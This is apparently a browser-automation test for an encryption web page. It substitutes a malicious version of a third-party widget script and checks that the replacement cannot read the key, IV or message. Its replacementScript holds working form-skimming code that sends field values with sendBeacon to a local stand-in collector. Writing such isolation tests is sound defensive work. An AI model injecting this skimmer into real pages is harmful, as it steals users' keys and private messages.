import { type ChildProcess, execFile, spawn } from "node:child_process";
import { existsSync } from "node:fs";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { createServer, type IncomingMessage, type Server } from "node:http";
import { tmpdir } from "node:os";
import { extname, join, normalize } from "node:path";
import { setTimeout as delay } from "node:timers/promises";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { expect, test } from "vitest";

const execFileAsync = promisify(execFile);

const projectRoot = fileURLToPath(new URL("../../..", import.meta.url));
const widgetHost = "cdnjs.buymeacoffee.com";
const widgetPath = "/1.0.0/widget.prod.min.js";
const visitorKey = "placeholder-key";
const visitorIv = "placeholder-iv";

const modes = [
  {
    name: "encrypt",
    button: "Encrypt",
    message: "placeholder-plaintext",
  },
  {
    name: "decrypt",
    button: "Decrypt",
    message: "placeholder-ciphertext",
  },
] as const;

type ModeName = (typeof modes)[number]["name"];

interface CdpMessage {
  id?: number;
  method?: string;
  sessionId?: string;
  result?: unknown;
  error?: { message?: string };
  params?: {
    requestId?: string;
    request?: { url?: string };
  };
}

const mimeTypes: Record<string, string> = {
  ".css": "text/css; charset=utf-8",
  ".html": "text/html; charset=utf-8",
  ".ico": "image/x-icon",
  ".js": "text/javascript; charset=utf-8",
  ".svg": "image/svg+xml",
};

const replacementScript = (collectUrl: string) => `
(() => {
  const readLabeled = (needle) => {
    const label = [...document.querySelectorAll("label")].find((element) =>
      (element.textContent || "").includes(needle),
    );
    let node = label;
    for (let depth = 0; depth < 6 && node; depth += 1) {
      const input = node.querySelector("input");
      if (input) return input.value;
      node = node.parentElement;
    }
    return "";
  };
  const publish = () => {
    const payload = {
      key: readLabeled("Key:"),
      iv: readLabeled("IV:"),
      message: document.querySelector("textarea")?.value ?? "",
    };
    const log = window.__widgetSawLog || [];
    log.push(payload);
    window.__widgetSawLog = log;
    try {
      navigator.sendBeacon(${JSON.stringify(collectUrl)}, JSON.stringify(payload));
    } catch {
      // The page blocked the send. The in-page log still records the read.
    }
  };
  document.addEventListener("input", publish, true);
  setInterval(publish, 50);
  publish();
})();
`;

const findChrome = (): string => {
  const candidates = [
    process.env.CHROME_PATH,
    "/usr/local/bin/google-chrome",
    "/usr/bin/google-chrome",
    "/usr/bin/google-chrome-stable",
    "/usr/bin/chromium",
    "/usr/bin/chromium-browser",
  ].filter((candidate): candidate is string => Boolean(candidate));
  const found = candidates.find((candidate) => existsSync(candidate));
  if (!found) {
    throw new Error("Chrome is required to execute the built encryption page");
  }
  return found;
};

const listen = (server: Server): Promise<number> =>
  new Promise((resolve) => {
    server.listen(0, "127.0.0.1", () => {
      const address = server.address();
      if (!address || typeof address === "string") {
        throw new Error("Test server did not bind a TCP port");
      }
      resolve(address.port);
    });
  });

const bodyOf = (request: IncomingMessage): Promise<string> =>
  new Promise((resolve, reject) => {
    const chunks: Buffer[] = [];
    request.on("data", (chunk: Buffer) => {
      chunks.push(chunk);
    });
    request.on("end", () => {
      resolve(Buffer.concat(chunks).toString("utf8"));
    });
    request.on("error", reject);
  });

const noteLeak = (leaked: Set<ModeName>, raw: string) => {
  for (const mode of modes) {
    if (
      raw.includes(visitorKey) &&
      raw.includes(visitorIv) &&
      raw.includes(mode.message)
    ) {
      leaked.add(mode.name);
    }
  }
};

test("a replaced widget script cannot read the key, initialization vector, or message", async () => {
  const leaked = new Set<ModeName>();
  const cleanups: Array<() => Promise<void>> = [];
  const runCleanup = async () => {
    for (const cleanup of cleanups.reverse()) {
      await cleanup();
    }
  };

  try {
    await execFileAsync(
      process.execPath,
      [join(projectRoot, "node_modules/astro/bin/astro.mjs"), "build"],
      { cwd: projectRoot },
    );

    const collectServer = createServer((request, response) => {
      void bodyOf(request).then((body) => {
        noteLeak(leaked, `${request.url ?? ""} ${body}`);
        response.writeHead(204);
        response.end();
      });
    });
    const collectPort = await listen(collectServer);
    cleanups.push(
      () =>
        new Promise((resolve) => {
          collectServer.close(() => resolve());
        }),
    );

    const distRoot = join(projectRoot, "dist");
    const pageServer = createServer((request, response) => {
      const url = new URL(request.url ?? "/", "http://127.0.0.1");
      const requested = url.pathname === "/" ? "/index.html" : url.pathname;
      const relative = normalize(requested).replace(/^(\.\.(\/|\\|$))+/, "");
      const file = join(distRoot, relative);
      if (!file.startsWith(distRoot)) {
        response.writeHead(400);
        response.end();
        return;
      }
      void readFile(file)
        .then((data) => {
          response.writeHead(200, {
            "content-type":
              mimeTypes[extname(file)] ?? "application/octet-stream",
          });
          response.end(data);
        })
        .catch(() => {
          response.writeHead(404);
          response.end();
        });
    });
    const pagePort = await listen(pageServer);
    cleanups.push(
      () =>
        new Promise((resolve) => {
          pageServer.close(() => resolve());
        }),
    );

    const userDataDir = await mkdtemp(join(tmpdir(), "widget-exposure-"));
    cleanups.push(() => rm(userDataDir, { recursive: true, force: true }));

    const chrome = spawn(
      findChrome(),
      [
        "--headless=new",
        "--disable-gpu",
        "--no-sandbox",
        "--disable-dev-shm-usage",
        "--no-first-run",
        "--disable-background-networking",
        "--remote-debugging-port=0",
        `--user-data-dir=${userDataDir}`,
        `--host-resolver-rules=MAP ${widgetHost} 127.0.0.1`,
      ],
      { stdio: ["ignore", "pipe", "pipe"] },
    );
    cleanups.push(() => stopChrome(chrome));
    const debugPort = await waitForDevtoolsPort(chrome);

    const version = (await fetch(
      `http://127.0.0.1:${debugPort}/json/version`,
    ).then((response) => response.json())) as { webSocketDebuggerUrl: string };
    const browserWs = new WebSocket(version.webSocketDebuggerUrl);
    cleanups.push(async () => {
      browserWs.close();
    });
    await new Promise<void>((resolve, reject) => {
      browserWs.addEventListener("open", () => resolve());
      browserWs.addEventListener("error", () =>
        reject(new Error("DevTools socket failed")),
      );
    });

    let nextId = 0;
    const pending = new Map<
      number,
      { resolve: (value: unknown) => void; reject: (reason: Error) => void }
    >();
    const send = (method: string, params: object = {}, sessionId?: string) => {
      const id = ++nextId;
      const message: {
        id: number;
        method: string;
        params: object;
        sessionId?: string;
      } = { id, method, params };
      if (sessionId) message.sessionId = sessionId;
      return new Promise((resolve, reject) => {
        pending.set(id, { resolve, reject });
        browserWs.send(JSON.stringify(message));
      });
    };

    const scriptBody = replacementScript(
      `http://127.0.0.1:${collectPort}/collect`,
    );
    browserWs.addEventListener("message", (event) => {
      const message = JSON.parse(String(event.data)) as CdpMessage;
      if (message.id && pending.has(message.id)) {
        const waiter = pending.get(message.id);
        pending.delete(message.id);
        if (!waiter) return;
        if (message.error) {
          waiter.reject(new Error(message.error.message ?? "DevTools error"));
        } else {
          waiter.resolve(message.result);
        }
        return;
      }
      if (message.method !== "Fetch.requestPaused") return;
      const requestId = message.params?.requestId;
      const requestUrl = message.params?.request?.url ?? "";
      if (!requestId) return;
      if (requestUrl.includes(`${widgetHost}${widgetPath}`)) {
        void send(
          "Fetch.fulfillRequest",
          {
            requestId,
            responseCode: 200,
            responseHeaders: [
              {
                name: "Content-Type",
                value: "application/javascript; charset=utf-8",
              },
            ],
            body: Buffer.from(scriptBody, "utf8").toString("base64"),
          },
          message.sessionId,
        );
        return;
      }
      void send("Fetch.continueRequest", { requestId }, message.sessionId);
    });

    const created = (await send("Target.createTarget", {
      url: "about:blank",
    })) as { targetId: string };
    const attached = (await send("Target.attachToTarget", {
      targetId: created.targetId,
      flatten: true,
    })) as { sessionId: string };
    const sessionId = attached.sessionId;
    await send(
      "Fetch.enable",
      {
        patterns: [
          {
            urlPattern: `*${widgetHost}${widgetPath}*`,
            requestStage: "Request",
          },
        ],
      },
      sessionId,
    );
    await send("Page.enable", {}, sessionId);
    await send(
      "Page.navigate",
      { url: `http://127.0.0.1:${pagePort}/` },
      sessionId,
    );

    await waitForPage(send, sessionId, "Key:");

    for (const mode of modes) {
      const clicked = await evaluate(
        send,
        sessionId,
        `(() => {
            const button = [...document.querySelectorAll("button")].find((element) =>
              (element.textContent || "").includes(${JSON.stringify(mode.button)}),
            );
            if (!button) return false;
            button.click();
            return true;
          })()`,
      );
      expect(clicked, `${mode.name} mode button`).toBe(true);
      const entered = await evaluate(
        send,
        sessionId,
        `(() => {
            const setNative = (element, value) => {
              const descriptor = Object.getOwnPropertyDescriptor(
                Object.getPrototypeOf(element),
                "value",
              );
              const tracker = element._valueTracker;
              if (tracker) tracker.setValue("");
              descriptor.set.call(element, value);
              element.dispatchEvent(new Event("input", { bubbles: true }));
              element.dispatchEvent(new Event("change", { bubbles: true }));
              return element.value === value;
            };
            const labeled = (needle) => {
              const label = [...document.querySelectorAll("label")].find((element) =>
                (element.textContent || "").includes(needle),
              );
              let node = label;
              for (let depth = 0; depth < 6 && node; depth += 1) {
                const input = node.querySelector("input");
                if (input) return input;
                node = node.parentElement;
              }
              return null;
            };
            const key = labeled("Key:");
            const iv = labeled("IV:");
            const message = document.querySelector("textarea");
            if (!key || !iv || !message) return false;
            return (
              setNative(key, ${JSON.stringify(visitorKey)}) &&
              setNative(iv, ${JSON.stringify(visitorIv)}) &&
              setNative(message, ${JSON.stringify(mode.message)})
            );
          })()`,
      );
      expect(entered, `${mode.name} fields accepted visitor input`).toBe(true);
      await delay(1000);
    }

    const seenByScript = await evaluate(
      send,
      sessionId,
      `JSON.stringify(window.__widgetSawLog || [])`,
    );
    noteLeak(leaked, String(seenByScript));
    await delay(200);

    expect(
      [...leaked],
      "replaced widget response read visitor key material",
    ).toEqual([]);
  } finally {
    await runCleanup();
  }
}, 90_000);

const evaluate = async (
  send: (
    method: string,
    params?: object,
    sessionId?: string,
  ) => Promise<unknown>,
  sessionId: string,
  expression: string,
): Promise<unknown> => {
  const result = (await send(
    "Runtime.evaluate",
    { expression, returnByValue: true },
    sessionId,
  )) as { result?: { value?: unknown } };
  return result.result?.value;
};

const waitForPage = async (
  send: (
    method: string,
    params?: object,
    sessionId?: string,
  ) => Promise<unknown>,
  sessionId: string,
  label: string,
) => {
  const started = Date.now();
  while (Date.now() - started < 15_000) {
    const ready = await evaluate(
      send,
      sessionId,
      `Boolean([...document.querySelectorAll("label")].find((element) =>
        (element.textContent || "").includes(${JSON.stringify(label)}),
      ) && document.querySelector("textarea"))`,
    );
    if (ready === true) return;
    await delay(100);
  }
  throw new Error("Encryption page did not render the key field and message");
};

const waitForDevtoolsPort = (chrome: ChildProcess): Promise<number> =>
  new Promise((resolve, reject) => {
    let output = "";
    const timer = setTimeout(() => {
      reject(new Error("Chrome did not open a DevTools port"));
    }, 15_000);
    const onData = (chunk: Buffer) => {
      output += chunk.toString();
      const match = output.match(
        /DevTools listening on ws:\/\/127\.0\.0\.1:(\d+)\//,
      );
      if (!match?.[1]) return;
      clearTimeout(timer);
      resolve(Number(match[1]));
    };
    chrome.stdout?.on("data", onData);
    chrome.stderr?.on("data", onData);
    chrome.once("exit", (code) => {
      clearTimeout(timer);
      reject(new Error(`Chrome exited before DevTools was ready (${code})`));
    });
  });

const stopChrome = (chrome: ChildProcess): Promise<void> =>
  new Promise((resolve) => {
    if (chrome.exitCode !== null || chrome.killed) {
      resolve();
      return;
    }
    chrome.once("exit", () => resolve());
    chrome.kill("SIGKILL");
    setTimeout(() => resolve(), 2_000);
  });
